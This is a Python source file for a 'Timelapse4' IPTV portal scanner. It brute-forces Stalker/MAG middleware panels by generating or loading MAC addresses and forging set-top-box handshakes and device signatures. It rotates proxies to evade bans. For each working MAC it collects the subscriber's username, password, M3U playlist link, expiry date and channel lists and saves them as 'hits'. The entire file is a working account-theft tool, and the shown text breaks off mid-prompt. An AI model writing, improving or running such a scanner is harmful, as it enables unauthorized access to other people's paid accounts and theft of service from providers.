import os
import sys
import threading
import subprocess
import pathlib
import base64
import datetime
import time
import hashlib
import urllib
import requests
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"

try:
    import androidhelper as sl4a
    ad = sl4a.Android()
except:
    ad = None

# ---------- UI & Credit ---------- #
def clear_screen():
    subprocess.run(["clear", ""])

def green(text):
    return f"\033[1;32m{text}\033[0m"

def yellow(text):
    return f"\033[1;33m{text}\033[0m"

def banner():
    bnr = f"""
{green('''
╔════════════════════════════════════════╗
║    ████████╗██╗███╗   ███╗███████╗    ║
║    ╚══██╔══╝██║████╗ ████║██╔════╝    ║
║       ██║   ██║██╔████╔██║█████╗      ║
║       ██║   ██║██║╚██╔╝██║██╔══╝      ║
║       ██║   ██║██║ ╚═╝ ██║███████╗    ║
║       ╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝    ║
║           TIMELAPSE4 EDITION          ║
╚════════════════════════════════════════╝
''')}
{yellow('===== IPTV Scanner Timelapse4 Edition =====')}
{green('Theme: Green-Yellow | Credit: timelapse4')}
"""
    print(bnr)

# ---------- Global Variables ---------- #
cpm = 0
cpmx = 0
hitr = 0
m3uon = 0
m3uvpn = 0
macon = 0
macvpn = 0
hitsay = 0
combosay = 0
bot = 0
panel = ""
tokenr = "\033[0m"
hitecho_file = "/sdcard/hit.mp3"
Dosyab = ""
hits_dir = "/sdcard/Hits/"
pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
genmacs = ""
bib = 0
comboc = ""
combototLen = ""
combouz = 0
combodosya = ""
proxyc = ""
proxytotLen = ""
proxydosya = ""
proxyuz = 0
randommu = ""
mactur = ""
randomturu = ""
seri = ""
serim = ""
proxi = ""
pro = ""
proxysay = 0
reqs = (
    "portal.php",
    "server/load.php",
    "c/portal.php",
    "stalker_portal/server/load.php",
    "stalker_portal/server/load.php - old",
    "stalker_portal/server/load.php - «▣»",
    "portal.php - Real Blue",
    "portal.php - httpS",
    "stalker_portal/server/load.php - httpS",
)
stalker_portal = ""
ban = ""
uzmanm = ""
realblue = ""
http = "http"
botgir = 1
yeninesil = (
    '00:1A:79:',
    '00:1A:70:',
    'E0:37:17:',
    'D4:CF:F9:',
    '33:44:CF:',
    '10:27:BE:',
    'A0:BB:3E:',
    '55:93:EA:',
    '04:D6:AA:',
    '11:33:01:',
    '00:1C:19:',
    '1A:00:6A:',
    '1A:00:FB:',
    '00:A1:79:',
    '00:1B:79:',
    '00:2A:79:',
)
nickn = ""
hitsay = 0
say = 1
combosay = 0

# --- Session ---
ses = requests.Session()

def echok(mac, bot, total, hitc, oran):
    global cpm, hitr, m3uon, m3uvpn, macon, macvpn, panel, tokenr
    cpmx = (time.time() - cpm)
    cpmx = (round(60 / cpmx)) if cpmx != 0 else cpm
    echo = f"""
╭──➢ {yellow('PANELPORT ➩ ' + str(panel))}
├─◉ {tokenr}{mac}  {green('CPM➢' + str(cpmx))}
├────◉ {yellow('Bot')}{bot}  {green('Total➢' + str(total))}  {str(hitr)}🄷🄸🅃➢{hitc}   {yellow('%' + str(oran))}
╰─◉ Mac➩ {green('On★' + str(macon))} ◉{yellow('VPN★' + str(macvpn))} M3U➩ {green('ON★' + str(m3uon))} ◉{yellow('OFF★' + str(m3uvpn))}
"""
    print(echo)
    cpm = time.time()

def bekle(bib,vr):
    animation = [
        "[■□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□]", "[■■■□□□□□□□□□□□□]",
        "[■■■■□□□□□□□□□□□]", "[■■■■■□□□□□□□□□□]", "[■■■■■■□□□□□□□□□]",
        "[■■■■■■■□□□□□□□□]", "[■■■■■■■■□□□□□□□]", "[■■■■■■■■■□□□□□□]",
        "[■■■■■■■■■■□□□□□]","[■■■■■■■■■■■□□□□]",
        "[■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■□□]",
        "[■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■]"
    ]
    time.sleep(0.2)
    sys.stdout.write("\r" + animation[bib % len(animation)]+' CheckingProxies')
    sys.stdout.flush()

def unicode(fyz):
    return fyz.encode('utf-8').decode("unicode-escape").replace('\/','/')

def duzel2(veri, vr):
    try:
        data = veri.split(f'"{vr}":"')[1].split('"')[0].replace('"','')
        return unicode(data)
    except: return ""

def duzelt1(veri, vr):
    try:
        data = veri.split(f'{vr}":"')[1].split('"')[0].replace('"','')
        return data
    except: return ""

def month_string_to_number(ay):
    m = {
        'jan': 1, 'feb': 2, 'mar': 3, 'apr':4, 'may':5, 'jun':6,
        'jul':7, 'aug':8, 'sep':9, 'oct':10, 'nov':11, 'dec':12
    }
    s = ay.strip()[:3].lower()
    return m.get(s, 0)

def tarih_clear(trh):
    try:
        ay = str(trh.split(' ')[0])
        gun = str(trh.split(', ')[0].split(' ')[1])
        yil = str(trh.split(', ')[1])
        ay = str(month_string_to_number(ay))
        d = datetime.date(int(yil), int(ay), int(gun))
        sontrh = time.mktime(d.timetuple())
        out = int((sontrh - time.time()) / 86400)
        return out
    except: return 0

def device(mac):
    mac = mac.upper()
    SN = hashlib.md5(mac.encode('utf-8')).hexdigest().upper()
    SNCUT = SN[:13]
    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest().upper()
    DEV1 = hashlib.sha256(SNCUT.encode('utf-8')).hexdigest().upper()
    SG = SNCUT + '+' + mac
    SING = hashlib.sha256(SG.encode('utf-8')).hexdigest().upper()
    return f"""
╭─➤💡DEVICE💡 INFO💡
├🔹Serial➤{SN}   
├🔹Serial_cut➤{SNCUT}
├🔹Dev_ID_1➤{DEV}
├🔹Dev_ID_2➤{SING}
╰─🔹Signature➤{DEV1} """

def m3ugoruntu(cid, user, pas, plink):
    durum = yellow("NO IMAGE 🚫")
    try:
        url = f"{http}://{plink}/live/{user}/{pas}/{cid}.ts"
        res = ses.get(url, headers=hea3(), timeout=(2,5), allow_redirects=False, stream=True)
        if res.status_code == 302:
            durum = green("IMAGE ✅")
    except:
        pass
    return durum

def hea3():
    return {
        "Icy-MetaData": "1",
        "User-Agent": "Lavf/57.83.100",
        "Accept-Encoding": "identity",
        "Host": panel,
        "Accept": "*/*",
        "Range": "bytes=0-",
        "Connection": "close",
    }

def hitecho(mac,trh):
    file = pathlib.Path(hitecho_file)
    try:
        if ad and file.exists():
            ad.mediaPlay(hitecho_file)
    except: pass
    print(f"{panel}\n{mac}\n{trh}\n")

def yax(hits):
    dosya=open(Dosyab,'a+') 
    dosya.write(hits)
    dosya.close()

def m3uapi(playerlink, mac, token):
    mt=""
    bag=0
    veri=""
    bad=0
    while True:
        try:
            res = ses.get(playerlink, headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
            veri=str(res.text)
            break
        except:
            if not proxi =="1":
                bad=bad+1
                if bad==3:
                    break
    if veri=="" or '404' in veri:
        bad=0
        while True:
            try:
                playerlink=playerlink.replace('player_api.php','panel_api.php')
                res = ses.get(playerlink, headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
                veri=str(res.text)
                break
            except:
                if not proxi =="1":
                    bad=bad+1
                    if bad==3:
                        break
    acon=""
    timezone=""
    message=""
    if 'active_cons' in veri:
        acon=veri.split('active_cons":')[1].split(',')[0].replace('"',"")
        mcon=veri.split('max_connections":')[1].split(',')[0].replace('"',"")
        status=veri.split('status":')[1].split(',')[0].replace('"',"")
        try:
            timezone=veri.split('timezone":"')[1].split('",')[0].replace("\/","/")
        except:pass
        realm=veri.split('url":')[1].split(',')[0].replace('"',"")
        port=veri.split('port":')[1].split(',')[0].replace('"',"")
        userm=veri.split('username":')[1].split(',')[0].replace('"',"")
        pasm=veri.split('password":')[1].split(',')[0].replace('"',"")
        bitism=veri.split('exp_date":')[1].split(',')[0].replace('"',"")
        try:
            message=veri.split('message":"')[1].split(',')[0].replace('"','')
            message=str(message.encode('utf-8').decode("unicode-escape")).replace('\/','/')
        except:pass
        if bitism=="null":
            bitism="Unlimited"
        else:
            bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))
        mt=f"""
╭─➤HITS ʙʏ {nickn}     
├─➤▣Message➩ {message} 
├➤▣Host➩ http://{panel}/c/
├➤▣Real➩ http://{realm}:{port}/c/
╰──➤▣Port➩ {port}
╭─➤💠🅸🅽🅵🅾💠     
├➤▣User➩ {userm}
├➤▣Pass➩ {pasm}
├─➤▣Exp.➩ {bitism} 
├──➤▣ActCon➩ {acon}
├──➤▣MaxCon➩ {mcon} 
├─➤▣Status➩ {status}
├➤▣TimeZone➩ {timezone}
╰──➤⚜️🆂🅿🅴🅴🅳🆇✴️🆄🅻🆃🅸🅼🅰⚜️"""
    return mt

def goruntu(link,cid):
    say=0
    duru=yellow("🆅🅿🅽 🅸🅼🅰🅶🅴 ❌ ")
    try:
        res = ses.get(link,  headers=hea3(), timeout=10, allow_redirects=False,stream=True)
        if res.status_code==302:
            duru=green("🆅🅿🅽 🅸🅼🅰🅶🅴 ✅ ")
    except:
        duru=yellow("🆅🅿🅽 🅸🅼🅰🅶🅴 ❌")
    return duru

def vpnip(ip):
    url9="https://freegeoip.app/json/"+ip
    vpn="Not Invalid"
    veri=""
    try:
        res = ses.get(url9,  timeout=7, verify=False)
        veri=str(res.text)
    except:
        vpn="Not Invalid"
    if not '404 page' in veri:
        if 'country_name' in veri:
            vpnc=veri.split('"city":"')[1].split('"')[0]
            vpnips=veri.split('"country_name":"')[1]
            vpn=vpnips.split('"')[0]
            vpn= vpn +' / ' +vpnc
        else:
            vpn="Not Invalid"
    return vpn

def url2(mac,random):
    macs=mac.upper()
    macs=urllib.parse.quote(macs)
    SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
    SNENC=SN.upper()
    SNCUT=SNENC[:13]
    DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
    DEVENC=DEV.upper()
    DEV1=hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
    DEVENC1=DEV1.upper()
    SG=SNCUT+(mac)
    SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
    SINGENC=SING.upper()
    url22=f"{http}://{panel}/{uzmanm}?type=stb&action=get_profile&JsHttpRequest=1-xml"
    if uzmanm=="stalker_portal/server/load.php":
        times=time.time()
        url22=f"{http}://{panel}/{uzmanm}?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r22-pub-270; ImageDate: Tue Dec 19 11:33:53 EET 2017; PORTAL version: 5.6.6; API Version: JS API version: 328; STB API version: 134; Player Engine version: 0x566&num_banks=2&sn={SNCUT}&stb_type=MAG270&client_type=STB&image_version=0.2.18&video_out=hdmi&device_id={DEVENC}&device_id2={DEVENC}&signature=OaRqL9kBdR5qnMXL+h6b+i8yeRs9/xWXeKPXpI48VVE=&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics=%7B%22mac%22%3A%22{macs}%22%2C%22sn%22%3A%22{SNCUT}%22%2C%22model%22%3A%22MAG270%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22BB340DE42B8A3032F84F5CAF137AEBA287CE8D51F44E39527B14B6FC0B81171E%22%2C%22random%22%3A%22{random}%22%7D&hw_version_2=85a284d980bbfb74dca9bc370a6ad160e968d350&timestamp={str(times)}&api_signature=262&prehash=efd15c16dc497e0839ff5accfdc6ed99c32c4e2a&JsHttpRequest=1-xml"
    return url22

def hea1(panel,mac):
    macs=mac.upper()
    macs=urllib.parse.quote(mac)
    panell=panel
    if uzmanm=="stalker_portal/server/load.php":
        panell=str(panel)+'/stalker_portal'
    data={
        "User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" ,
        "Referer": f"{http}://{panell}/c/" ,
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
        "Cookie": f"mac={macs}; stb_lang=en; timezone=Europe%2FParis;",
        "Accept-Encoding": "gzip, deflate" ,
        "Connection": "Keep-Alive" ,
        "X-User-Agent":"Model: MAG254; Link: Ethernet",
    }
    if uzmanm=="stalker_portal/server/load.php":
        data={
            "User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3" ,
            "Referer": f"{http}://{panell}/c/" ,
            "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
            "Cookie": f"mac={macs}; stb_lang=en; timezone=Europe%2FParis;",
            "Accept-Encoding": "gzip, deflate" ,
            "Connection": "Keep-Alive" ,
            "X-User-Agent":"Model: MAG254; Link: Ethernet",
        }
    return data

def hea2(mac,token):
    macs=mac.upper()
    macs=urllib.parse.quote(mac)
    panell=panel
    if uzmanm=="stalker_portal/server/load.php":
        panell=str(panel)+'/stalker_portal'
    data={
        "User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3" ,
        "Referer": f"{http}://{panell}/c/" ,
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
        "Cookie": f"mac={macs}; stb_lang=en; timezone=Europe%2FParis;",
        "Accept-Encoding": "gzip, deflate" ,
        "Connection": "Keep-Alive" ,
        "X-User-Agent":"Model: MAG254; Link: Ethernet",
        "Authorization": "Bearer "+str(token),
    }
    if uzmanm=="stalker_portal/server/load.php":
        data={
            "User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3" ,
            "Referer": f"{http}://{panell}/c/" ,
            "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
            "Cookie": f"mac={macs}; stb_lang=en; timezone=Europe%2FParis;",
            "Accept-Encoding": "gzip, deflate" ,
            "Connection": "Keep-Alive" ,
            "X-User-Agent":"Model: MAG254; Link: Ethernet",
            "Authorization": "Bearer "+str(token),
        }
    return data

def combogetir():
    global combosay
    combosay += 1
    try:
        return combototLen[combosay]
    except: return ""

def proxygetir():
    if proxi =="1":
        global proxysay,bib
        bib += 1
        bekle(bib,"xdeep")
        if bib==15:
            bib=0
        while True:
            try:
                proxysay += 1
                if proxysay == proxyuz:
                    proxysay = 0
                proxygeti = (proxytotLen[proxysay])
                pveri = proxygeti.replace('\n','')
                pip = pveri.split(':')[0]
                pport = pveri.split(':')[1]
                proxies = {}
                if pro=="1":
                    pname=pveri.split(':')[2]
                    ppass=pveri.split(':')[3]
                    proxies={'http':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport,'https':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport}
                if pro=="2":
                    proxies={'http':'socks4://'+pip+':'+pport,'https':'socks4://'+pip+':'+pport}
                if pro=="3":
                    proxies={'http':'socks5://'+pip+':'+pport,'https':'socks5://'+pip+':'+pport}
                if pro=="4":
                    proxies={'http':'http://'+pip+':'+pport,'https':'https://'+pip+':'+pport}
                break
            except: pass
    else:
        proxies=""
    return proxies

def randommac():
    global genmacs,combosay, k, jj, iii, mactur, seri, randomturu, randommu
    combosay += 1
    if randomturu == '2':
        while True:
            genmac = str(mactur)+"%02x:%02x:%02x"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
            if not genmac in genmacs:
                genmacs=genmacs + ' '
                break
    else:
        if iii >= 257:
            iii=0
            jj+=1
        if jj >= 257:
            if not len(seri)==2:
                jj=0
            k+=1
            if len(seri)==2:
                quit()
        if k==257:
            quit()
        genmac = str(mactur)+"%02x:%02x:%02x"% (k,jj,iii)
        iii+=1
    if serim=="1":
        if len(seri) ==1:
            genmac=str(genmac).replace(str(genmac[:10]),str(mactur)+seri)
        if len(seri)==2:
            genmac=str(genmac).replace(str(genmac[:11]),str(mactur)+seri)
    genmac=genmac.replace(':100',':10')
    genmac=genmac.upper()
    return genmac

def dosyasec():
    global comboc, combototLen, proxyuz, proxydosya, combodosya, proxyc, proxytotLen, proxyuz, combouz, randomturu, serim, seri, mactur, randommu
    say=0
    dsy=""
    if comboc=="":
        mesaj="Mac Combo List, Combo select..!\nSelect the file with the Mac Combo"
        dir='/sdcard/combo/'
        dsy="\n       \033[1;4;94;47m 0=⫸ Random (OTO MAC)  \033[0m\n"
    else:
        mesaj="Proxsy Combo select..!\nSelect the combo where it is the proxy"
        dir='/sdcard/proxy/'
    if not os.path.exists(dir):
        os.mkdir(dir)
    for files in os.listdir(dir):
        say+=1
        dsy+=str(say)+"=⫸ "+files+'\n'
    print (f"""Combo Files,Select Number
Choose your combo from the list below!!

{dsy}
\033[33min your combo folder {str(say)} file found!
    """)
    dsyno=str(input("\033[31m"+mesaj+"\nCombo No =\033[0m"))
    say=0
    dosya=""
    for files in os.listdir(dir):
        say+=1
        if dsyno==str(say):
            dosya=(dir+files)
            break
    say=0
    try:
        if not dosya=="":
            print(dosya)
        else:
            clear_screen()
            print("Incorrect combo file selection..!")
            quit()
    except:
        if comboc=="":
            if dsyno=="0" or dsyno=="":
                clear_screen()
                nnesil=str(yeninesil)
                nnesil=(nnesil.count(',')+1)
                for xd in range(0,(nnesil)):
                    tire='  》'
                    if int(xd) <9:
                        tire='   》'
                    print(str(xd+1)+tire+yeninesil[xd])
                mactur=input("Select Mac type...\n Answer=")
                if mactur=="":
                    mactur=1
                randomturu=input("""
\033[33mFor cascading mac = \033[31m1
\033[33mFor random random   = \033[31m2
        
\033[0m\033[1mMac Combination Type=\033[31m""")
                if randomturu=="":
                    randomturu="2"
                serim=""
                serim=input("""\033[0m
\033[33mUse Serial Mac?
\033[1m\033[34mYes (1) \033[0m or \033[1m\033[32mNo (2) \033[0m Write Number!! 
        
    Answer=""")
                mactur=yeninesil[int(mactur)-1]
                if serim =="1":
                    seri=input("Sample="+mactur+"\033[31m5\033[0m\nSample="+mactur+"\033[31mFa\033[32m\nWrite one or two values!!!\033[0m\n\033[1m"+mactur+"\033[31m")
                combouz=input("""\033[0m
Type the Number of Macs to Scan.
Number of Macs=⫸""")
                if combouz=="":
                    combouz=30000
                combouz=int(combouz)
                randommu="xdeep"
        else:
            clear_screen()
            print("Incorrect combo file selection...!")
            quit()
    if comboc=="":
        if randommu=="":
            combodosya=dosya
            comboc=open(dosya, 'r')
            combototLen=comboc.readlines()
            combouz=(len(combototLen))
        else:
            comboc='feyzo'
    else:
        proxydosya=dosya
        proxyc=open(dosya, 'r')
        proxytotLen=proxyc.readlines()
        proxyuz=(len(proxytotLen))

def XD():
    global m3uvpn,m3uon,macon,macvpn,bot,hit,tokenr,hitr, combosay, panel, uzmanm, nickn
    bot+=1
    for feyzo in range(combouz):
        if comboc=="feyzo":
            mac=randommac()
        else:
            macv=re.search(pattern,combogetir(),re.IGNORECASE)
            if macv:
                mac=macv.group()
            else:
                continue
        url=f"{http}://{panel}/{uzmanm}?type=stb&action=handshake&token=&prehash=false&JsHttpRequest=1-xml"
        prox=proxygetir()
        oran=round(((combosay)/(combouz)*100),2)
        echok(mac, bot, combosay, hit, oran)
        while True:
            try:
                res=ses.get(url,headers=hea1(panel,mac),proxies=prox,timeout=(3))
                break
            except:
                prox=proxygetir()
        veri=str(res.text)
        random=""
        if not 'token":"' in veri:
            tokenr="\033[35m"
            ses.close
            res.close
            continue
        tokenr="\033[0m"
        token=duzelt1(veri,"token")
        if 'random' in veri:
            random=duzelt1(veri,"random")
        veri=""
        while True:
            try:
                res=ses.get(url2(mac,random),headers=hea2(mac,token),proxies=prox,timeout=(3))
                break
            except:
                prox=proxygetir()
        veri=str(res.text)
        id="null"
        ip=""
        login=""
        parent_password=""
        password=""
        stb_type=""
        tariff_plan_id=""
        comment=""
        country=""
        settings_password=""
        expire_billing_date=""
        max_online=""
        expires=""
        ls=""
        try:
            id=veri.split('{"js":{"id":')[1]
            id=str(id.split(',"name')[0])
        except:pass
        try:
            ip=str(duzel2(veri,"ip"))
        except:pass
        try:
            expires=str(duzel2(veri,"expires"))
        except:pass
        if id=="null" and expires=="" and ban=="":
            continue
            ses.close
            res.close
        if uzmanm=="stalker_portal/server/load.php":
            if 'login":"' in veri:
                login=str(duzel2(veri,"login"))
                parent_password=str(duzel2(veri,"parent_password"))
                password=str(duzel2(veri,"password"))
                stb_type=str(duzel2(veri,"stb_type"))
                tariff_plan_id=str(duzel2(veri,"tariff_plan_id"))
                comment=str(duzel2(veri,"comment"))
                country=str(duzel2(veri,"country"))
                settings_password=str(duzel2(veri,"settings_password"))
                expire_billing_date=str(duzel2(veri,"expire_billing_date"))
                ls=str(duzel2(veri,"ls"))
                try:
                    max_online=str(duzel2(veri,"max_online"))
                except:pass
        url=f"{http}://{panel}/{uzmanm}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
        veri=""
        while True:
            try:
                res=ses.get(url,headers=hea2(mac,token),proxies=prox,timeout=(3))
                break
            except:
                prox=proxygetir()
        veri=str(res.text)
        if veri.count('phone')==0 and veri.count('end_date')==0 and expires=="" and expire_billing_date=="":
            continue
            ses.close
            res.close
        fname=""
        tariff_plan=""
        ls=""
        trh=""
        bill=""
        if uzmanm=="stalker_portal/server/load.php":
            try:
                fname=str(duzel2(veri,"fname"))
            except:pass
            try:
                tariff_plan=str(duzel2(veri,"tariff_plan"))
            except:pass
            try:
                bill=str(duzel2(veri,"created"))
            except:pass
        if "phone" in veri:
            trh=str(duzel2(veri,"phone"))
        if "end_date" in veri:
            trh=str(duzel2(veri,"end_date"))
        if trh=="":
            if not expires=="":
                trh=expires
        try:
            trh=(datetime.datetime.fromtimestamp(int(trh)).strftime('%d-%m-%Y %H:%M:%S'))
        except:pass
        if '(-' in trh:
            continue
            ses.close
            res.close
        if trh.lower()[:2] =='un':
            KalanGun=(" Days")
        else:
            try:
                KalanGun=(str(tarih_clear(trh))+" Days")
                trh=trh+' '+ KalanGun
            except:pass
        if trh=="":
            if uzmanm=="stalker_portal/server/load.php":
                trh=expire_billing_date
        veri=""
        cid="1842"
        url=f"{http}://{panel}/{uzmanm}?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
        bad=0
        while True:
            try:
                res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
                veri=str(res.text)
                if 'total' in veri:
                    cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
                if uzmanm=="stalker_portal/server/load.php":
                    cid=(str(res.text).split('id":"')[5].split('"')[0])
                break
            except:pass
        user=""
        pas=""
        link=""
        real=panel
        if not expires=="":
            veri=""
            cmd=""
            url=f"{http}://{panel}/{uzmanm}?action=get_ordered_list&type=vod&p=1&JsHttpRequest=1-xml"
            while True:
                try:
                    res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
                    veri=str(res.text)
                    break
                except:pass
            if not 'cmd' in veri:
                continue
            cmd=duzel2(veri,'cmd')
            veri=""
            url=f"{http}://{panel}/{uzmanm}?type=vod&action=create_link&cmd={str(cmd)}&series=&forced_storage=&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
            while True:
                try:
                    res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
                    veri=str(res.text)
                    break
                except:pass
            if 'cmd":"' in veri:
                link=veri.split('cmd":"')[1].split('"')[0].replace('\/','/')
                user=str(link.replace('movie/','').split('/')[3])
                real=f"{http}://{link.split('://')[1].split('/')[0]}/c/"
                pas=str(link.replace('movie/','').split('/')[4])
                cid=duzel2(veri,'id')
                m3ulink=f"http://{real.replace('http://','').replace('/c/', '')}/get.php?username={str(user)}&password={str(pas)}&type=m3u_plus&output=m3u8"
        hitecho(mac,trh)
        hit+=1
        hitr="\033[1;36m"
        veri=""
        if user=="":
            while True:
                try:
                    url7 = f"{http}://{panel}/{uzmanm}?type=itv&action=create_link&cmd=ffmpeg http://localhost/ch/{str(cid)}_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
                    res = ses.get(url7, headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
                    veri=str(res.text)
                    if 'ffmpeg ' in veri:
                        link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
                    else:
                        if 'cmd":"' in veri:
                            link=veri.split('cmd":"')[1].split('"')[0].replace('\/','/')
                            user=login
                            pas=password
                            real=f"http://{link.split('://')[1].split('/')[0]}/c/"
                    if 'ffmpeg ' in veri:
                        user=str(link.replace('live/','').split('/')[3])
                        pas=str(link.replace('live/','').split('/')[4])
                        if real==panel:
                            real=f"http://{link.split('://')[1].split('/')[0]}/c/"
                    m3ulink=f"http://{real.replace('http://','').replace('/c/', '')}/get.php?username={str(user)}&password={str(pas)}&type=m3u_plus&output=m3u8"
                    break
                except:pass
        durum=""
        if not link=="":
            try:
                durum=goruntu(link,cid)
            except:pass
        if not m3ulink=="":
            playerlink=str(f"http://{real.replace('http://','').replace('/c/','')}/player_api.php?username={user}&password={pas}")
            plink=real.replace('http://','').replace('/c/','')
            playerapi=m3uapi(playerlink,mac,token)
            m3uimage=m3ugoruntu(cid,user,pas,plink)
            if playerapi=="":
                playerlink=str(f"http://{panel.replace('http://','').replace('/c/','')}/player_api.php?username={user}&password={pas}")
                plink=panel.replace('http://','').replace('/c/','')
                playerapi=m3uapi(playerlink,mac,token)
                m3uimage=m3ugoruntu(cid,user,pas,plink)
        if m3uimage=="GORUNTU YOK 🦂 🕸️":
            m3uvpn+=1
        else:
            m3uon+=1
        if durum=="🆅🅿🅽 🅸🅼🅰🅶🅴 ❌ " or durum=="Invalid Opps":
            macvpn+=1
        else:
            macon+=1
        vpn=""
        if not ip =="":
            vpn=vpnip(ip)
        else:
            vpn="No Client IP Address"
        livelist=""
        vodlist=""
        serieslist=""
        liveurl=f"{http}://{panel}/{uzmanm}?action=get_genres&type=itv&JsHttpRequest=1-xml"
        if not expires=="":
            liveurl=f"{http}://{panel}/{uzmanm}?type=itv&action=get_genres&JsHttpRequest=1-xml" 
        if uzmanm=="stalker_portal/server/load.php":
            liveurl=f"{http}://{panel}/{uzmanm}?type=itv&action=get_genres&JsHttpRequest=1-xml"
        vodurl=f"{http}://{panel}/{uzmanm}?action=get_categories&type=vod&JsHttpRequest=1-xml"
        seriesurl=f"{http}://{panel}/{uzmanm}?action=get_categories&type=series&JsHttpRequest=1-xml"
        listlink=liveurl
        livel=' «🌎» '
        livelist=""
        vodlist=""
        serieslist=""
        def list(listlink,mac,token,livel):
            kategori=""
            veri=""
            while True:
                try:
                    res = ses.get(listlink,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3), verify=False)
                    veri=str(res.text)
                    break
                except:pass
            if veri.count('title":"')>0:
                for i in veri.split('title":"'):
                    try:
                        kanal=""
                        kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
                    except:pass
                    kategori=kategori+kanal+livel
            list=kategori
            return list
        livelist=list(listlink,mac,token,livel)
        vodlist=list(vodurl,mac,token,' «🎬» ')
        serieslist=list(seriesurl,mac,token,' «📺» ')
        # Show full info (credit)
        print(f"\n==== {green('Timelapse4 Scanner HIT!')} ====")
        print(f"Mac: {mac}")
        print(f"Panel: {panel}")
        print(f"User: {user} Pass: {pas}")
        print(f"M3U: {m3ulink}")
        print(f"Live: {livelist}")
        print(f"Vod: {vodlist}")
        print(f"Series: {serieslist}")
        print(f"VPN: {vpn}")
        print(f"Status: {durum}")
        print(f"{device(mac)}")
        print(f"Credit: Timelapse4\n")
        hitsay+=1
        if hitsay >= hit:
            hitr="\033[1;33m"

def main():
    global panel, uzmanm, nickn, Dosyab, comboc, combosay, proxi, pro, proxyuz, botgir, k, jj, iii
    clear_screen()
    banner()
    nickn = input(green("Your Nickname: ")).strip()
    if not os.path.exists(hits_dir):
        os.mkdir(hits_dir)
    panel = input(yellow("Panel:Port=")).strip()
    print("\n")
    for idx, val in enumerate(reqs, 1):
        print(f"{green(str(idx))}=⫸ {yellow(val)}")
    uzmanm = input(yellow('Number Select:')).strip()
    if uzmanm == "0":
        uzmanm = input(green("Write Request:")).strip()
    elif uzmanm == "":
        uzmanm = "portal.php"
    else:
        uzmanm = reqs[int(uzmanm)-1]
    if uzmanm=="stalker_portal/server/load.php - old":
        stalker_portal="2"
        uzmanm="stalker_portal/server/load.php"
    if uzmanm=="stalker_portal/server/load.php - «▣»":
        stalker_portal="1"
        uzmanm="stalker_portal/server/load.php"    
    if uzmanm=="portal.php - No Ban":
        ban="ban"
        uzmanm="portal.php"
    if uzmanm=="portal.php - Real Blue":
        realblue="real"
        uzmanm="portal.php"
    if uzmanm=="portal.php - httpS":
        uzmanm="portal.php"
        http="https"
    if uzmanm=="stalker_portal/server/load.php - httpS":
        uzmanm="stalker_portal/server/load.php"
        http="https"
    panel=panel.replace('stalker_portal','').replace('http://','').replace('/c/','').replace('/c','').replace('/','').replace(' ','')
    Dosyab=f"/sdcard/hits/🅿🅺🅶.{panel.replace(':','_').replace('/','')}.txt"
    comboc = ""
    combosay = 0
    k = jj = iii = 0
    dosyasec()
    proxi=input("""
Do you want to use Proxies..!
1 - Yes
2 - No

write 1 or 2 =""")
    if proxi =="1":
        dosyasec()
        pro=input("""
What is the proxy type in the file you selected?
    1 - ipVanish
    2 - Socks4 
    3 - Socks5
    4 - Http/Https
